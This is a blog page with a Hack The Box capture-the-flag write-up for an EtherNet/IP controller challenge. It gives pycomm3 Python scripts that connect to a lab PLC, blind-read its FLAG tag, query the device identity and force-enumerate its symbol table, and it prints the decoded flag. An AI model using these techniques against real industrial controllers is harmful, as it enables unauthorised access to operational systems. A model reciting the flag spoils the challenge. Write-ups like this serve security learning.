@@ -1,0 +1,1064 @@
+<!DOCTYPE html>
+<html lang="zh-CN" data-theme="dark">
+
+<head>
+
+<meta charset="UTF-8">
+
+<meta
+    name="viewport"
+    content="width=device-width, initial-scale=1.0"
+>
+
+<title>HTB ETHER TAG WRITEUP | SYC</title>
+
+<meta
+    name="description"
+    content="Challenge Scenario We’ve discovered an EtherNet/IP controller on the network. Your mission: connect to the device and retrieve the value of the FLAG tag. Can you extract..."
+>
+
+<meta
+    name="robots"
+    content="index, follow"
+>
+
+<link
+    rel="canonical"
+    href="https://syc-sigma.vercel.app/p/HTB%20Ether%20Tag%20Writeup"
+>
+
+<meta
+    property="og:title"
+    content="HTB ETHER TAG WRITEUP | SYC"
+>
+
+<meta
+    property="og:description"
+    content="Challenge Scenario We’ve discovered an EtherNet/IP controller on the network. Your mission: connect to the device and retrieve the value of the FLAG tag. Can you extract..."
+>
+
+<meta
+    property="og:type"
+    content="article"
+>
+
+<meta
+    property="og:url"
+    content="https://syc-sigma.vercel.app/p/HTB%20Ether%20Tag%20Writeup"
+>
+
+<meta
+    property="og:site_name"
+    content="SYC"
+>
+
+<meta
+    name="twitter:card"
+    content="summary"
+>
+
+<meta
+    name="twitter:title"
+    content="HTB ETHER TAG WRITEUP | SYC"
+>
+
+<meta
+    name="twitter:description"
+    content="Challenge Scenario We’ve discovered an EtherNet/IP controller on the network. Your mission: connect to the device and retrieve the value of the FLAG tag. Can you extract..."
+>
+
+<link rel="icon" type="image/png" href="/favicon.png">
+
+<link
+    rel="shortcut icon"
+    href="/favicon.ico"
+    type="image/x-icon"
+>
+
+<link
+    href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;700&family=Fira+Code&display=swap"
+    rel="stylesheet"
+>
+
+<link
+    rel="stylesheet"
+    href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/github-dark.min.css"
+    id="hljs-style"
+>
+
+<script
+    src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/highlight.min.js"
+    defer
+></script>
+
+
+<style>
+
+:root[data-theme="dark"] {
+    --bg-1: #050505;
+    --bg-2: #0a0c1a;
+    --bg-3: #120d1a;
+    --text-main: #ffffff;
+    --text-dim: rgba(255, 255, 255, 0.5);
+    --accent: #ffffff;
+    --canvas-opacity: 0.9;
+    --code-bg: rgba(0, 0, 0, 0.5);
+}
+
+:root[data-theme="light"] {
+    --bg-1: #fdfdfd;
+    --bg-2: #f0f4ff;
+    --bg-3: #f9f0ff;
+    --text-main: #000000;
+    --text-dim: rgba(0, 0, 0, 0.5);
+    --accent: #000000;
+    --canvas-opacity: 0.5;
+    --code-bg: rgba(0, 0, 0, 0.05);
+}
+
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    transition:
+        background-color 0.6s,
+        color 0.4s;
+}
+
+html {
+    scroll-behavior: smooth;
+}
+
+body {
+    background:
+        linear-gradient(
+            125deg,
+            var(--bg-1),
+            var(--bg-2),
+            var(--bg-3),
+            var(--bg-1)
+        );
+
+    background-size: 400% 400%;
+
+    animation:
+        spaceFlow 25s ease infinite;
+
+    color: var(--text-main);
+
+    font-family:
+        'Inter',
+        -apple-system,
+        BlinkMacSystemFont,
+        sans-serif;
+
+    line-height: 1.8;
+
+    overflow-x: hidden;
+}
+
+@keyframes spaceFlow {
+    0% {
+        background-position: 0% 50%;
+    }
+
+    50% {
+        background-position: 100% 50%;
+    }
+
+    100% {
+        background-position: 0% 50%;
+    }
+}
+
+#article-canvas {
+    position: fixed;
+    top: 0;
+    left: 0;
+
+    width: 100%;
+    height: 100%;
+
+    z-index: -1;
+
+    pointer-events: none;
+
+    opacity: var(--canvas-opacity);
+}
+
+.theme-toggle {
+    position: fixed;
+
+    bottom: 30px;
+    right: 30px;
+
+    width: 48px;
+    height: 48px;
+
+    border-radius: 50%;
+
+    background: var(--text-main);
+    color: var(--bg-1);
+
+    border: none;
+
+    cursor: pointer;
+
+    z-index: 2000;
+
+    display: flex;
+    align-items: center;
+    justify-content: center;
+
+    font-family: 'Fira Code';
+
+    font-size: 10px;
+
+    font-weight: bold;
+
+    box-shadow:
+        0 10px 30px rgba(0,0,0,0.2);
+}
+
+#progress {
+    position: fixed;
+
+    top: 0;
+    left: 0;
+
+    height: 3px;
+
+    background: var(--accent);
+
+    width: 0%;
+
+    z-index: 2000;
+}
+
+nav {
+    padding: 25px 40px;
+
+    backdrop-filter: blur(20px);
+    -webkit-backdrop-filter: blur(20px);
+
+    position: sticky;
+
+    top: 0;
+
+    z-index: 1000;
+
+    display: flex;
+
+    justify-content: space-between;
+
+    align-items: center;
+}
+
+nav a {
+    color: var(--text-dim);
+
+    text-decoration: none;
+
+    font-size: 11px;
+
+    font-family: 'Fira Code';
+
+    letter-spacing: 1px;
+}
+
+nav a:hover {
+    color: var(--text-main);
+}
+
+.content-wrapper {
+    max-width: 900px;
+
+    margin: 40px auto;
+
+    padding: 40px 24px;
+
+    min-height: 80vh;
+}
+
+.article-header {
+    margin-bottom: 70px;
+}
+
+.article-header h1 {
+    font-size:
+        clamp(32px, 7vw, 64px);
+
+    font-weight: 700;
+
+    color: var(--text-main);
+
+    letter-spacing: -4px;
+
+    line-height: 1;
+
+    text-transform: uppercase;
+}
+
+.article-meta {
+    margin-top: 20px;
+
+    color: var(--text-dim);
+
+    font-family: 'Fira Code';
+
+    font-size: 11px;
+
+    letter-spacing: 1px;
+}
+
+.markdown-body {
+    overflow-wrap: break-word;
+}
+
+.markdown-body img {
+    max-width: 100%;
+
+    height: auto;
+
+    border-radius: 12px;
+
+    margin: 30px 0;
+
+    display: block;
+
+    box-shadow:
+        0 20px 50px rgba(0,0,0,0.1);
+}
+
+.markdown-body h1 {
+    font-size: 38px;
+
+    margin: 50px 0 20px;
+
+    color: var(--text-main);
+}
+
+.markdown-body h2 {
+    font-size: 28px;
+
+    margin: 50px 0 20px;
+
+    color: var(--text-main);
+
+    border-bottom:
+        1px solid var(--text-dim);
+
+    padding-bottom: 8px;
+}
+
+.markdown-body h3 {
+    font-size: 22px;
+
+    margin: 40px 0 15px;
+
+    color: var(--text-main);
+}
+
+.markdown-body p {
+    margin-bottom: 25px;
+
+    font-size: 17px;
+
+    opacity: 0.85;
+}
+
+.markdown-body ul,
+.markdown-body ol {
+    margin: 20px 0 25px;
+
+    padding-left: 30px;
+}
+
+.markdown-body li {
+    margin-bottom: 8px;
+}
+
+.markdown-body a {
+    color: var(--text-main);
+
+    text-decoration:
+        underline;
+
+    text-underline-offset: 4px;
+}
+
+.markdown-body blockquote {
+    margin: 25px 0;
+
+    padding: 15px 20px;
+
+    border-left:
+        3px solid var(--text-main);
+
+    color: var(--text-dim);
+}
+
+.markdown-body pre {
+    background:
+        var(--code-bg) !important;
+
+    padding: 25px;
+
+    border:
+        1px solid var(--text-dim);
+
+    border-radius: 12px;
+
+    margin: 30px 0;
+
+    overflow-x: auto;
+
+    backdrop-filter: blur(10px);
+}
+
+.markdown-body code {
+    font-family: 'Fira Code';
+
+    font-size: 14px;
+
+    background:
+        rgba(128,128,128,0.1);
+
+    padding: 3px 6px;
+
+    border-radius: 4px;
+}
+
+.markdown-body pre code {
+    background: transparent;
+
+    padding: 0;
+}
+
+.markdown-body table {
+    width: 100%;
+
+    border-collapse: collapse;
+
+    margin: 30px 0;
+
+    overflow-x: auto;
+}
+
+.markdown-body th,
+.markdown-body td {
+    border:
+        1px solid var(--text-dim);
+
+    padding: 10px;
+
+    text-align: left;
+}
+
+.markdown-body th {
+    color: var(--text-main);
+}
+
+@media (max-width: 768px) {
+
+    .content-wrapper {
+        padding: 20px;
+    }
+
+    nav {
+        padding: 15px 20px;
+    }
+
+    .article-header h1 {
+        letter-spacing: -2px;
+    }
+
+    .markdown-body p {
+        font-size: 16px;
+    }
+}
+
+</style>
+
+</head>
+
+
+<body>
+
+<div id="progress"></div>
+
+<canvas id="article-canvas"></canvas>
+
+
+<button
+    class="theme-toggle"
+    onclick="toggleTheme()"
+>
+    MODE
+</button>
+
+
+<nav>
+
+<a href="/">
+    &lt;- BACK_TO_TERMINAL
+</a>
+
+<span
+    id="reading-id"
+    style="
+        font-family:'Fira Code';
+        font-size:10px;
+        color:var(--text-dim);
+    "
+>
+    SYSTEM: SYNCED
+</span>
+
+</nav>
+
+
+<main class="content-wrapper">
+
+<header class="article-header">
+
+<h1>
+HTB ETHER TAG WRITEUP
+</h1>
+
+<div class="article-meta">
+    HTB ETHER TAG WRITEUP.MD
+</div>
+
+</header>
+
+
+<article class="markdown-body">
+
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*sBX4P_zYLzw286W_sARLbg.png" /></p>
+<h4>Challenge Scenario</h4>
+<hr />
+<p>We’ve discovered an EtherNet/IP controller on the network. Your mission: connect to the device and retrieve the value of the FLAG tag. Can you extract the flag and prove your skills?</p>
+<p>namp at first</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*3IxnzHkCz5cRjL0nKWm2jw.png" /></p>
+<p>so,use</p>
+<p>pip install pycomm3</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*ZHALN4vk8JYodIb7GO1hiQ.png" /></p>
+<p>use this </p>
+<p>from pycomm3 import LogixDriver, CIPDriver</p>
+<h1>尝试不同的路径组合</h1>
+<p>paths = [‘154.57.164.68:31357/0’, ‘154.57.164.68:31357/1’]</p>
+<p>for path in paths:<br />
+ print(f”[*] 正在尝试路径: {path}”)<br />
+ # 使用 LogixDriver，但禁用自动扫描标签表 (init_tags=False)<br />
+ with LogixDriver(path, init_tags=False, init_program_tags=False) as plc:<br />
+ try:<br />
+ if plc.open():<br />
+ print(“[+] 连接成功! 正在尝试盲读 ‘FLAG’…”)<br />
+ # 直接尝试读取，不依赖本地标签缓存<br />
+ res = plc.read(‘FLAG’)<br />
+ if res.value is not None:<br />
+ print(f”\n[!] 成功拿到 FLAG: {res.value}”)<br />
+ exit()<br />
+ else:<br />
+ print(f”[-] 在此路径下未读到 FLAG: {res.error}”)<br />
+ except Exception as e:<br />
+ print(f”[x] 此路径不可用: {e}”)</p>
+<p>print(“\n[<em>] 所有常用槽位读取失败。尝试最后的‘通用标识’获取…”)<br />
+with CIPDriver(‘154.57.164.68:31357’) as plc:<br />
+ # 询问设备是谁 (Identity Object, Class 1, Instance 1, Attr 1)<br />
+ info = plc.generic_message(service=b’\x01', class_code=b’\x01', instance=1, attribute=1)<br />
+ print(f”[</em>] 设备原始响应: {info.value}”)</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*nVfw52Sqnt0DmncOKcyOsg.png" /></p>
+<p>we found 1756-L61/B LOGIX5561</p>
+<p>than use this</p>
+<p>from pycomm3 import CIPDriver<br />
+import struct</p>
+<p>IP = ‘154.57.164.68’<br />
+PORT = 31357</p>
+<p>def force_enumerate_symbols():<br />
+ with CIPDriver(f’{IP}:{PORT}’) as plc:<br />
+ print(“[*] 正在尝试强行枚举符号表实例 (Class 0x6B)…”)<br />
+<br />
+ # 尝试读取 Class 0x6B 的实例列表 (Service 0x01: Get_Attributes_All)<br />
+ # 这会返回 PLC 中所有标签的 ID 和部分元数据<br />
+ res = plc.generic_message(<br />
+ service=b’\x01', <br />
+ class_code=b’\x6b’, <br />
+ instance=1, # 尝试从第 1 个实例开始<br />
+ attribute=0<br />
+ )<br />
+<br />
+ if res.value:<br />
+ print(f”[+] 发现实例数据: {res.value.hex()}”)<br />
+ else:<br />
+ print(f”[-] 无法枚举实例: {res.error}”)</p>
+<h1>针对之前 FLAG 响应 b’\x00\x00' 的特殊处理：</h1>
+<p># 尝试用 Service 0x4D (Read Tag Fragmented) — 用于读取超长数据（如长字符串）<br />
+ print(“\n[*] 尝试碎片化读取 ‘FLAG’ (应对长字符串)…”)<br />
+ # 请求读取 100 字节，偏移量 0<br />
+ read_data = b’\x01\x00' + struct.pack(‘&lt;I’, 0) <br />
+ res = plc.generic_message(<br />
+ service=b’\x52', # Unconnected Send 或尝试 0x4D<br />
+ class_code=b’\x6b’,<br />
+ instance=0,<br />
+ attribute=0,<br />
+ request_data=read_data,<br />
+ route_path=b’\x91\x04FLAG\x00\x01\x00'<br />
+ )<br />
+<br />
+ if res.value:<br />
+ print(f”[!] 原始碎片数据: {res.value}”)<br />
+ # 尝试 ASCII 解码<br />
+ print(f”[!] 尝试解码: {res.value.decode(errors=’ignore’)}”)</p>
+<p>if <strong>name</strong> == “<strong>main</strong>”:<br />
+ force_enumerate_symbols()</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*6uCsseIYqW72n47E6s7yXQ.png" /></p>
+<ul>
+<li><code>48 00</code> -&gt; <strong>H</strong></li>
+<li><code>54 00</code> -&gt; <strong>T</strong></li>
+<li><code>42 00</code> -&gt; <strong>B</strong></li>
+<li><code>7b 00</code> -&gt; <strong>{</strong></li>
+<li><code>33 00</code> -&gt; <strong>3</strong></li>
+<li><code>74 00</code> -&gt; <strong>t</strong></li>
+<li><code>68 00</code> -&gt; <strong>h</strong></li>
+<li><code>33 00</code> -&gt; <strong>3</strong></li>
+<li><code>72 00</code> -&gt; <strong>r</strong></li>
+<li><code>6e 00</code> -&gt; <strong>n</strong></li>
+<li><code>33 00</code> -&gt; <strong>3</strong></li>
+<li><code>74 00</code> -&gt; <strong>t</strong></li>
+<li><code>31 00</code> -&gt; <strong>1</strong></li>
+<li><code>70 00</code> -&gt; <strong>p</strong></li>
+<li><code>5f 00</code> -&gt; <strong>_</strong></li>
+<li><code>70 00</code> -&gt; <strong>p</strong></li>
+<li><code>77 00</code> -&gt; <strong>w</strong></li>
+<li><code>6e 00</code> -&gt; <strong>n</strong></li>
+<li><code>33 00</code> -&gt; <strong>3</strong></li>
+<li><code>64 00</code> -&gt; <strong>d</strong></li>
+<li><code>7d 00</code> -&gt; <strong>}</strong></li>
+</ul>
+<p>so,here is the flag</p>
+<p><strong><em>HTB{3th3rn3t1p_pwn3d}</em></strong></p>
+
+</article>
+
+</main>
+
+
+<script>
+
+/* ==========================================================
+   Theme
+   ========================================================== */
+
+function toggleTheme() {
+
+    const root =
+        document.documentElement;
+
+    const target =
+        root.getAttribute('data-theme') === 'dark'
+            ? 'light'
+            : 'dark';
+
+    root.setAttribute(
+        'data-theme',
+        target
+    );
+
+    localStorage.setItem(
+        'theme',
+        target
+    );
+
+    const style =
+        document.getElementById(
+            'hljs-style'
+        );
+
+    if (style) {
+
+        style.href =
+            target === 'dark'
+                ? "https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/github-dark.min.css"
+                : "https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/github.min.css";
+    }
+}
+
+
+/* ==========================================================
+   Restore Theme
+   ========================================================== */
+
+try {
+
+    document.documentElement
+        .setAttribute(
+            'data-theme',
+            localStorage.getItem('theme') || 'dark'
+        );
+
+} catch (e) {
+
+    document.documentElement
+        .setAttribute(
+            'data-theme',
+            'dark'
+        );
+}
+
+
+/* ==========================================================
+   Code Highlight
+   ========================================================== */
+
+window.addEventListener(
+    'load',
+    () => {
+
+        if (
+            window.hljs
+        ) {
+
+            document
+                .querySelectorAll(
+                    'pre code'
+                )
+                .forEach(
+                    (el) => {
+                        hljs.highlightElement(el);
+                    }
+                );
+        }
+
+    }
+);
+
+
+/* ==========================================================
+   Reading ID
+   ========================================================== */
+
+document
+    .getElementById('reading-id')
+    .innerText =
+        'SYSTEM: HTB ETHER TAG WRITEUP.MD';
+
+
+/* ==========================================================
+   Reading Progress
+   ========================================================== */
+
+window.addEventListener(
+    'scroll',
+    () => {
+
+        const winScroll =
+            document.documentElement.scrollTop;
+
+        const height =
+            document.documentElement.scrollHeight -
+            document.documentElement.clientHeight;
+
+        const percentage =
+            height > 0
+                ? (winScroll / height) * 100
+                : 0;
+
+        document
+            .getElementById('progress')
+            .style.width =
+                percentage + '%';
+
+    }
+);
+
+
+/* ==========================================================
+   Dynamic Background
+   ========================================================== */
+
+const canvas =
+    document.getElementById(
+        'article-canvas'
+    );
+
+const ctx =
+    canvas.getContext('2d');
+
+let fluidNodes = [];
+
+let trailParticles = [];
+
+const mouse = {
+    x: -500,
+    y: -500
+};
+
+
+function initCanvas() {
+
+    canvas.width =
+        window.innerWidth;
+
+    canvas.height =
+        window.innerHeight;
+
+    fluidNodes =
+        Array.from(
+            { length: 3 },
+            () => ({
+
+                x:
+                    Math.random() *
+                    canvas.width,
+
+                y:
+                    Math.random() *
+                    canvas.height,
+
+                vx:
+                    (Math.random() - 0.5) *
+                    0.4,
+
+                vy:
+                    (Math.random() - 0.5) *
+                    0.4,
+
+                size:
+                    Math.random() *
+                    (canvas.width * 0.4) +
+                    canvas.width * 0.3
+            })
+        );
+}
+
+
+window.onmousemove =
+    (e) => {
+
+        mouse.x =
+            e.clientX;
+
+        mouse.y =
+            e.clientY;
+
+        for (
+            let i = 0;
+            i < 2;
+            i++
+        ) {
+
+            trailParticles.push(
+                new Particle(
+                    mouse.x,
+                    mouse.y
+                )
+            );
+        }
+    };
+
+
+class Particle {
+
+    constructor(x, y) {
+
+        this.x = x;
+
+        this.y = y;
+
+        this.vx =
+            (Math.random() - 0.5) *
+            1.5;
+
+        this.vy =
+            (Math.random() - 0.5) *
+            1.5;
+
+        this.life = 1.0;
+
+        this.decay =
+            0.015 +
+            Math.random() * 0.02;
+
+        this.size =
+            Math.random() * 2.5 +
+            0.5;
+    }
+
+    update() {
+
+        this.x += this.vx;
+
+        this.y += this.vy;
+
+        this.life -= this.decay;
+    }
+
+    draw(color) {
+
+        ctx.fillStyle =
+            `rgba(${color}, ${this.life * 0.4})`;
+
+        ctx.beginPath();
+
+        ctx.arc(
+            this.x,
+            this.y,
+            this.size,
+            0,
+            Math.PI * 2
+        );
+
+        ctx.fill();
+    }
+}
+
+
+function draw() {
+
+    const isDark =
+        document.documentElement
+            .getAttribute(
+                'data-theme'
+            ) === 'dark';
+
+    ctx.fillStyle =
+        isDark
+            ? "rgba(5, 5, 5, 0.15)"
+            : "rgba(253, 253, 253, 0.15)";
+
+    ctx.fillRect(
+        0,
+        0,
+        canvas.width,
+        canvas.height
+    );
+
+    ctx.globalCompositeOperation =
+        isDark
+            ? "lighter"
+            : "multiply";
+
+
+    const colorRGB =
+        isDark
+            ? "60, 70, 100"
+            : "200, 210, 240";
+
+
+    fluidNodes.forEach(
+        node => {
+
+            node.x += node.vx;
+
+            node.y += node.vy;
+
+
+            if (
+                node.x < 0 ||
+                node.x > canvas.width
+            ) {
+                node.vx *= -1;
+            }
+
+
+            if (
+                node.y < 0 ||
+                node.y > canvas.height
+            ) {
+                node.vy *= -1;
+            }
+
+
+            const g =
+                ctx.createRadialGradient(
+                    node.x,
+                    node.y,
+                    0,
+                    node.x,
+                    node.y,
+                    node.size
+                );
+
+
+            g.addColorStop(
+                0,
+                `rgba(${colorRGB}, 0.3)`
+            );
+
+            g.addColorStop(
+                1,
+                "transparent"
+            );
+
+
+            ctx.fillStyle = g;
+
+            ctx.beginPath();
+
+            ctx.arc(
+                node.x,
+                node.y,
+                node.size,
+                0,
+                Math.PI * 2
+            );
+
+            ctx.fill();
+
+        }
+    );
+
+
+    ctx.globalCompositeOperation =
+        "source-over";
+
+
+    const particleRGB =
+        isDark
+            ? "255, 255, 255"
+            : "0, 0, 0";
+
+
+    trailParticles.forEach(
+        (p, i) => {
+
+            p.update();
+
+            p.draw(
+                particleRGB
+            );
+
+            if (
+                p.life <= 0
+            ) {
+                trailParticles.splice(
+                    i,
+                    1
+                );
+            }
+        }
+    );
+
+
+    requestAnimationFrame(
+        draw
+    );
+}
+
+
+window.addEventListener(
+    'resize',
+    initCanvas
+);
+
+initCanvas();
+
+draw();
+
+</script>
+
+</body>
+
+</html>
